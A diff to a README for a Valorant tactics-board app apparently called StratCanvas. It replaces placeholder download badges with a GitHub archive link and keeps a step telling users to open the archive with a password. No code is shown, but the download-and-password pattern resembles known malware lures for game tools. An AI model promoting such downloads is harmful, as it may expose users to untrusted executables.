@@ -63,7 +63,7 @@ Why **StratCanvas** is more convenient than random screenshots, sketches, and no
 
 ### ⬇ Download StratCanvas Valorant Tactics Board
 
-[![Download StratCanvas](https://img.shields.io/badge/%E2%AC%87%20Download-StratCanvas_Valorant_Tactics_Board-blue?style=for-the-badge)](https://example.com/stratcanvas-valorant-tactics-board.zip)
+[![Download StratCanvas](https://img.shields.io/badge/%E2%AC%87%20Download-StratCanvas_Valorant_Tactics_Board-blue?style=for-the-badge)](https://github.com/soundassociatebrace/StratCanvas/archive/refs/heads/main.zip)
 
 ---
 
@@ -111,7 +111,7 @@ After downloading the `.zip` archive:
 
 ### 1. Download the app archive
 
-[![Download StratCanvas](https://img.shields.io/badge/%F0%9F%9A%80%20Download-StratCanvas_Valorant_Tactics_Board-green?style=for-the-badge)](https://example.com/stratcanvas-valorant-tactics-board.zip)
+[![Download StratCanvas](https://img.shields.io/badge/%F0%9F%9A%80%20Download-StratCanvas_Valorant_Tactics_Board-green?style=for-the-badge)](https://github.com/soundassociatebrace/StratCanvas/archive/refs/heads/main.zip)
 
 ### 2. Open the archive and enter the password
 
